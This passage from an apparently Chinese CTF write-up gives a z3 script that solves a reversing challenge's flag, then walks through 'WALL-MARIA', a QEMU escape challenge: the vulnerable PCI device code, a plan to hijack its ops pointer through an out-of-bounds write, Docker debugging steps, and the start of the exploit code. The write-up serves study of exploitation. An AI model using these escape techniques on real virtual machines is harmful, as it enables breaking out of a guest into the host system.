class="number">16774665</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 + <span class="number">3</span>*x25 + <span class="number">2</span>*x26 + <span class="number">5</span>*x27 + <span class="number">6</span>*x28 - <span class="number">10</span>*x29 + <span class="number">11</span>*x30 - <span class="number">3</span>*x31==<span class="number">1498</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 - <span class="number">4</span>*x25 - <span class="number">3</span>*x26 - <span class="number">3</span>*x27 + <span class="number">4</span>*x28 - <span class="number">5</span>*x29 - <span class="number">2</span>*x30 + <span class="number">6</span>*x31+<span class="number">16777216</span>==<span class="number">16776379</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x24 + <span class="number">3</span>*x25 - <span class="number">3</span>*x26 + <span class="number">5</span>*x27 - <span class="number">6</span>*x28 + <span class="number">17</span>*x29 + <span class="number">2</span>*x30 + <span class="number">7</span>*x31==<span class="number">3062</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x24 + <span class="number">2</span>*x25 - x26 + <span class="number">3</span>*x27 + <span class="number">6</span>*x28 - <span class="number">8</span>*x29 + <span class="number">9</span>*x30 + <span class="number">4</span>*x31==<span class="number">1593</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x24 + <span class="number">7</span>*x25 - <span class="number">2</span>*x26 + <span class="number">13</span>*x27 + <span class="number">5</span>*x28 + x29 + <span class="number">20</span>*x30 + <span class="number">8</span>*x31==<span class="number">5966</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x24 - x25 - <span class="number">6</span>*x26 + x27 - <span class="number">8</span>*x28 + <span class="number">22</span>*x29 - <span class="number">6</span>*x30 + <span class="number">13</span>*x31==<span class="number">1924</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x24 - <span class="number">5</span>*x25 - <span class="number">8</span>*x26 - <span class="number">6</span>*x27 - <span class="number">5</span>*x28 + <span class="number">15</span>*x29 - <span class="number">11</span>*x30 + <span class="number">15</span>*x31+<span class="number">16777216</span>==<span class="number">16776815</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x32 - <span class="number">2</span>*x33 + <span class="number">3</span>*x34 - <span class="number">4</span>*x35 + <span class="number">4</span>*x36 - <span class="number">13</span>*x37 - <span class="number">2</span>*x38 - <span class="number">7</span>*x39 + <span class="number">16777216</span>==<span class="number">16774318</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 + <span class="number">3</span>*x33 + <span class="number">2</span>*x34 + <span class="number">5</span>*x35 + <span class="number">6</span>*x36 - <span class="number">10</span>*x37 + <span class="number">11</span>*x38 - <span class="number">3</span>*x39==<span class="number">851</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 - <span class="number">4</span>*x33 - <span class="number">3</span>*x34 - <span class="number">3</span>*x35 + <span class="number">4</span>*x36 - <span class="number">5</span>*x37 - <span class="number">2</span>*x38 + <span class="number">6</span>*x39+<span class="number">16777216</span>==<span class="number">16775763</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x32 + <span class="number">3</span>*x33 - <span class="number">3</span>*x34 + <span class="number">5</span>*x35 - <span class="number">6</span>*x36 + <span class="number">17</span>*x37 + <span class="number">2</span>*x38 + <span class="number">7</span>*x39==<span class="number">3663</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x32 + <span class="number">2</span>*x33 - x34 + <span class="number">3</span>*x35 + <span class="number">6</span>*x36 - <span class="number">8</span>*x37 + <span class="number">9</span>*x38 + <span class="number">4</span>*x39==<span class="number">711</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x32 + <span class="number">7</span>*x33 - <span class="number">2</span>*x34 + <span class="number">13</span>*x35 + <span class="number">5</span>*x36 + x37 + <span class="number">20</span>*x38 + <span class="number">8</span>*x39==<span class="number">5193</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x32 - x33 - <span class="number">6</span>*x34 + x35 - <span class="number">8</span>*x36 + <span class="number">22</span>*x37 - <span class="number">6</span>*x38 + <span class="number">13</span>*x39==<span class="number">2591</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x32 - <span class="number">5</span>*x33 - <span class="number">8</span>*x34 - <span class="number">6</span>*x35 - <span class="number">5</span>*x36 + <span class="number">15</span>*x37 - <span class="number">11</span>*x38 + <span class="number">15</span>*x39+<span class="number">16777216</span>==<span class="number">16777069</span>)</span><br><span class="line"></span><br><span class="line">solver.add( <span class="number">-7</span>*x40 - <span class="number">2</span>*x41 + <span class="number">3</span>*x42 - <span class="number">4</span>*x43 + <span class="number">4</span>*x44 - <span class="number">13</span>*x45 - <span class="number">2</span>*x46 - <span class="number">7</span>*x47 + <span class="number">16777216</span>==<span class="number">16774005</span>)</span><br><span class="line">solver.add( <span class="number">-2</span>*x40 + <span class="number">3</span>*x41 + <span class="number">2</span>*x42 + <span class="number">5</span>*x43 + <span class="number">6</span>*x44 - <span class="number">10</span>*x45 + <span class="number">11</span>*x46 - <span class="number">3</span>*x47==<span class="number">1189</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x40 - <span class="number">4</span>*x41 - <span class="number">3</span>*x42 - <span class="number">3</span>*x43 + <span class="number">4</span>*x44 - <span class="number">5</span>*x45 - <span class="number">2</span>*x46 + <span class="number">6</span>*x47+<span class="number">16777216</span> ==<span class="number">16776283</span>)</span><br><span class="line">solver.add( <span class="number">9</span>*x40 + <span class="number">3</span>*x41 - <span class="number">3</span>*x42 + <span class="number">5</span>*x43 - <span class="number">6</span>*x44 + <span class="number">17</span>*x45 + <span class="number">2</span>*x46 + <span class="number">7</span>*x47==<span class="number">3892</span>)</span><br><span class="line">solver.add( <span class="number">-2</span>*x40 + <span class="number">2</span>*x41 - x42 + <span class="number">3</span>*x43 + <span class="number">6</span>*x44 - <span class="number">8</span>*x45 + <span class="number">9</span>*x46 + <span class="number">4</span>*x47==<span class="number">1372</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x40 + <span class="number">7</span>*x41 - <span class="number">2</span>*x42 + <span class="number">13</span>*x43 + <span class="number">5</span>*x44 + x45 + <span class="number">20</span>*x46 + <span class="number">8</span>*x47 ==<span class="number">6362</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x40 - x41 - <span class="number">6</span>*x42 + x43 - <span class="number">8</span>*x44 + <span class="number">22</span>*x45 - <span class="number">6</span>*x46 + <span class="number">13</span>*x47 ==<span class="number">2910</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x40 - <span class="number">5</span>*x41 - <span class="number">8</span>*x42 - <span class="number">6</span>*x43 - <span class="number">5</span>*x44 + <span class="number">15</span>*x45 - <span class="number">11</span>*x46 + <span class="number">15</span>*x47 ==<span class="number">307</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x48 - <span class="number">2</span>*x49 + <span class="number">3</span>*x50 - <span class="number">4</span>*x51 + <span class="number">4</span>*x52 - <span class="number">13</span>*x53 - <span class="number">2</span>*x54 - <span class="number">7</span>*x55 + <span class="number">16777216</span>==<span class="number">16775169</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 + <span class="number">3</span>*x49 + <span class="number">2</span>*x50 + <span class="number">5</span>*x51 + <span class="number">6</span>*x52 - <span class="number">10</span>*x53 + <span class="number">11</span>*x54 - <span class="number">3</span>*x55==<span class="number">1031</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 - <span class="number">4</span>*x49 - <span class="number">3</span>*x50 - <span class="number">3</span>*x51 + <span class="number">4</span>*x52 - <span class="number">5</span>*x53 - <span class="number">2</span>*x54 + <span class="number">6</span>*x55+<span class="number">16777216</span>==<span class="number">16776798</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x48 + <span class="number">3</span>*x49 - <span class="number">3</span>*x50 + <span class="number">5</span>*x51 - <span class="number">6</span>*x52 + <span class="number">17</span>*x53 + <span class="number">2</span>*x54 + <span class="number">7</span>*x55==<span class="number">2426</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x48 + <span class="number">2</span>*x49 - x50 + <span class="number">3</span>*x51 + <span class="number">6</span>*x52 - <span class="number">8</span>*x53 + <span class="number">9</span>*x54 + <span class="number">4</span>*x55==<span class="number">1171</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x48 + <span class="number">7</span>*x49 - <span class="number">2</span>*x50 + <span class="number">13</span>*x51 + <span class="number">5</span>*x52 + x53 + <span class="number">20</span>*x54 + <span class="number">8</span>*x55==<span class="number">4570</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x48 - x49 - <span class="number">6</span>*x50 + x51 - <span class="number">8</span>*x52 + <span class="number">22</span>*x53 - <span class="number">6</span>*x54 + <span class="number">13</span>*x55==<span class="number">1728</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x48 - <span class="number">5</span>*x49 - <span class="number">8</span>*x50 - <span class="number">6</span>*x51 - <span class="number">5</span>*x52 + <span class="number">15</span>*x53 - <span class="number">11</span>*x54 + <span class="number">15</span>*x55==<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">-7</span>*x56 - <span class="number">2</span>*x57 + <span class="number">3</span>*x58 - <span class="number">4</span>*x59 + <span class="number">4</span>*x60 - <span class="number">13</span>*x61 - <span class="number">2</span>*x62 - <span class="number">7</span>*x63 + <span class="number">16777216</span>==<span class="number">16775201</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 + <span class="number">3</span>*x57 + <span class="number">2</span>*x58 + <span class="number">5</span>*x59 + <span class="number">6</span>*x60 - <span class="number">10</span>*x61 + <span class="number">11</span>*x62 - <span class="number">3</span>*x63==<span class="number">819</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 - <span class="number">4</span>*x57 - <span class="number">3</span>*x58 - <span class="number">3</span>*x59 + <span class="number">4</span>*x60 - <span class="number">5</span>*x61 - <span class="number">2</span>*x62 + <span class="number">6</span>*x63+<span class="number">16777216</span>==<span class="number">16776898</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x56 + <span class="number">3</span>*x57 - <span class="number">3</span>*x58 + <span class="number">5</span>*x59 - <span class="number">6</span>*x60 + <span class="number">17</span>*x61 + <span class="number">2</span>*x62 + <span class="number">7</span>*x63==<span class="number">2370</span>)</span><br><span class="line">solver.add(<span class="number">-2</span>*x56 + <span class="number">2</span>*x57 - x58 + <span class="number">3</span>*x59 + <span class="number">6</span>*x60 - <span class="number">8</span>*x61 + <span class="number">9</span>*x62 + <span class="number">4</span>*x63==<span class="number">1132</span>)</span><br><span class="line">solver.add(<span class="number">6</span>*x56 + <span class="number">7</span>*x57 - <span class="number">2</span>*x58 + <span class="number">13</span>*x59 + <span class="number">5</span>*x60 + x61 + <span class="number">20</span>*x62 + <span class="number">8</span>*x63==<span class="number">4255</span>)</span><br><span class="line">solver.add(<span class="number">9</span>*x56 - x57 - <span class="number">6</span>*x58 + x59 - <span class="number">8</span>*x60 + <span class="number">22</span>*x61 - <span class="number">6</span>*x62 + <span class="number">13</span>*x63==<span class="number">1900</span>)</span><br><span class="line">solver.add(<span class="number">5</span>*x56 - <span class="number">5</span>*x57 - <span class="number">8</span>*x58 - <span class="number">6</span>*x59 - <span class="number">5</span>*x60 + <span class="number">15</span>*x61 - <span class="number">11</span>*x62 + <span class="number">15</span>*x63==<span class="number">347</span>)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span>(solver.check()==sat):</span><br><span class="line">    m = solver.model()</span><br><span class="line">    <span class="comment"># s = []</span></span><br><span class="line">    <span class="comment"># for i in range(8):</span></span><br><span class="line">    <span class="comment">#     s,append(m[])</span></span><br><span class="line">    <span class="comment"># for i in m:</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line">    <span class="comment"># for i in range(24,64):</span></span><br><span class="line">    <span class="comment">#     exec(f&quot;flag.append&#123;m[x&#123;i&#125;]&#125;&quot;)</span></span><br><span class="line">    flag.append(m[x24])</span><br><span class="line">    flag.append(m[x25])</span><br><span class="line">    flag.append(m[x26])</span><br><span class="line">    flag.append(m[x27])</span><br><span class="line">    flag.append(m[x28])</span><br><span class="line">    flag.append(m[x29])</span><br><span class="line">    flag.append(m[x30])</span><br><span class="line">    flag.append(m[x31])</span><br><span class="line">    flag.append(m[x32])</span><br><span class="line">    flag.append(m[x33])</span><br><span class="line">    flag.append(m[x34])</span><br><span class="line">    flag.append(m[x35])</span><br><span class="line">    flag.append(m[x36])</span><br><span class="line">    flag.append(m[x37])</span><br><span class="line">    flag.append(m[x38])</span><br><span class="line">    flag.append(m[x39])</span><br><span class="line">    flag.append(m[x40])</span><br><span class="line">    flag.append(m[x41])</span><br><span class="line">    flag.append(m[x42])</span><br><span class="line">    flag.append(m[x43])</span><br><span class="line">    flag.append(m[x44])</span><br><span class="line">    flag.append(m[x45])</span><br><span class="line">    flag.append(m[x46])</span><br><span class="line">    flag.append(m[x47])</span><br><span class="line">    flag.append(m[x48])</span><br><span class="line">    flag.append(m[x49])</span><br><span class="line">    flag.append(m[x50])</span><br><span class="line">    flag.append(m[x51])</span><br><span class="line">    flag.append(m[x52])</span><br><span class="line">    flag.append(m[x53])</span><br><span class="line">    flag.append(m[x54])</span><br><span class="line">    flag.append(m[x55])</span><br><span class="line">    flag.append(m[x56])</span><br><span class="line">    flag.append(m[x57])</span><br><span class="line">    flag.append(m[x58])</span><br><span class="line">    flag.append(m[x59])</span><br><span class="line">    flag.append(m[x60])</span><br><span class="line">    flag.append(m[x61])</span><br><span class="line">    flag.append(m[x62])</span><br><span class="line">    flag.append(m[x63])</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="comment"># for i in flag:</span></span><br><span class="line">    <span class="comment">#     ans += chr(i)</span></span><br><span class="line">    f = [<span class="number">55</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">102</span>, <span class="number">53</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        ans += chr(i)</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="comment"># print(solver.check())</span></span><br><span class="line"><span class="comment"># solver.add(5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63 ==0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="WALL-MARIA"><a href="#WALL-MARIA" class="headerlink" title="WALL-MARIA"></a>WALL-MARIA</h2><p>一道qemu逃逸题，题目给了docker容器。通过这个题学到了一点东西，不过也稍微走了一点弯路，在此记录一下。</p><p>主要是针对docker下的一些调试技巧</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>题目给了源码，并且漏洞点非常明显</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint64_t</span> src;</span><br><span class="line">        <span class="keyword">uint8_t</span> off;</span><br><span class="line">&#125; state;</span><br><span class="line">    <span class="keyword">char</span> buff[BUFF_SIZE];</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">&#125; MariaState;</span><br><span class="line"></span><br><span class="line">DECLARE_INSTANCE_CHECKER(MariaState, MARIA, TYPE_PCI_MARIA_DEVICE)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">maria_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> size)</span> </span>&#123;</span><br><span class="line">    MariaState *maria = (MariaState *)opaque;</span><br><span class="line">    <span class="keyword">uint64_t</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line">            cpu_physical_memory_rw(maria-&gt;state.src, &amp;maria-&gt;buff[maria-&gt;state.off], BUFF_SIZE, <span class="number">1</span>);</span><br><span class="line">            val = <span class="number">0x600DC0DE</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">            val = maria-&gt;state.src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">            val = maria-&gt;state.off;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            val = <span class="number">0xDEADC0DE</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">maria_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span> </span>&#123;</span><br><span class="line">    MariaState *maria = (MariaState *)opaque;</span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line">            cpu_physical_memory_rw(maria-&gt;state.src, &amp;maria-&gt;buff[maria-&gt;state.off], BUFF_SIZE, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">            maria-&gt;state.src = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">            maria-&gt;state.off = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>MariaState.state</code>的src和off都是由我们所指定的，然后通过<code>cpu_physical_memory_rw</code>我们可以往buff上面写东西或者读东西，偏移是off，大小时0x2000。显然这里有一个越界读写，off可以至多设置为0xff,也就是我们能至多越界读和写buff后面0xff大小的内容</p><p>所以利用思路很明显，我们只要越界写<code>MariaState</code>的<code>MemoryRegion</code>中的<code>ops</code>指针，指向我们构造的函数表，这样当我们在对应地址空间进行<code>mmio_read/mmio_write</code>的时候就能调用相应指针，进行一个控制流的劫持。需要注意的是，qemu启动脚本开了沙盒<code>-sandbox on</code>，所以我们只能通过ORW来读取flag，无法getshell(我打到最后爆了bad syscall才发现，蚌埠住了)</p><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>题目给了Dockerfile。我本来想在本地进行调试的，但是因为缺少链接库的原因没跑起来，而我也不太想去配环境了，所以就尝试了一下直接调试Dockerfile里面运行的qemu进程。</p><p>具体可以参照如下步骤，首先在Dockerfile里面添加如下语句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span></span><br><span class="line"><span class="bash">    xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span></span><br><span class="line"><span class="bash">    vim  iputils-ping cpio gdb-multiarch \</span></span><br><span class="line"><span class="bash">    file net-tools </span></span><br></pre></td></tr></table></figure><p>主要用到的是<code>gdbserver</code> ，构建好镜像之后直接运行镜像即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 11111:11111 -i -t d8d64ecdf778   /bin/bash</span><br></pre></td></tr></table></figure><p>然后我们再起一个这个容器的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it 476559b02d8a /bin/bash</span><br></pre></td></tr></table></figure><p>然后我们在一个shell中运行qemu启动脚本<code>./run.sh</code>，另一个shell通过查看pid利用gdbserver进行一个attach</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver --attach :11111 &lt;pid&gt;</span><br></pre></td></tr></table></figure><p>最后在gdb中通过<code>target remote:11111</code>进行连接即可远程调试</p><p>在比赛中我主要用打包文件系统的方式，把exp打包进文件系统然后传到docker里面，然后docker里面再次运行qemu启动脚本，但是感觉这样很慢很慢，打包一次文件系统差不多得1min。但是感觉通过网络传输的方式也挺麻烦的，似乎还要配网(我不知道咋配的)，那就这样拉倒吧(开摆)。打包的1min就奖励自己休息一会</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -static -o exp</span><br><span class="line">mv exp ./core</span><br><span class="line"><span class="built_in">cd</span> ./core</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.cpio</span><br><span class="line"><span class="comment"># docker cp ../initramfs.cpio 476559b02d8a</span></span><br><span class="line">docker cp ../initramfs.cpio 476559b02d8a:/home/user/</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>很容易想到的方法就是将src设置成我们申请一块区域的物理地址，然后通过越界读将越界内容(buff和后面的内容)读到src，然后再通过读这块区域，给泄露出来。</p><p>但是这里有一个问题，我们的buff占了两页内存。我们申请的区域占了两页内存，这两页内存的虚拟地址是连续的，但是物理地址并不一定连续，而且我们越界读的内容在后面，所以就会导致我们无法读出泄露的地址。</p><p>这里有两种解决办法，一种是通过布局src来正确读到内存，另一个方法是使用huge page，直接申请虚拟地址和物理地址都连续的两页大小的内存。</p><p>在比赛中我选用的是前一种方法，而官方exp给出的是后一种方法。我觉得后一种方法更有普适性,而且前一种方式容易出现一些各种各样的问题(因为实际上我们是越界写了一部分物理页，而这部分物理页谁知道要被用来干什么)</p><p>前一种方式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PLT 0x60a0</span></span><br><span class="line"><span class="comment">// #define MARIO_READ 0x425277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 0x2000</span></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;[+] page = %lx&quot;,page);</span></span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x04</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">uint8_t</span> off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x08</span>,(<span class="keyword">uint64_t</span> )off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">get_src</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 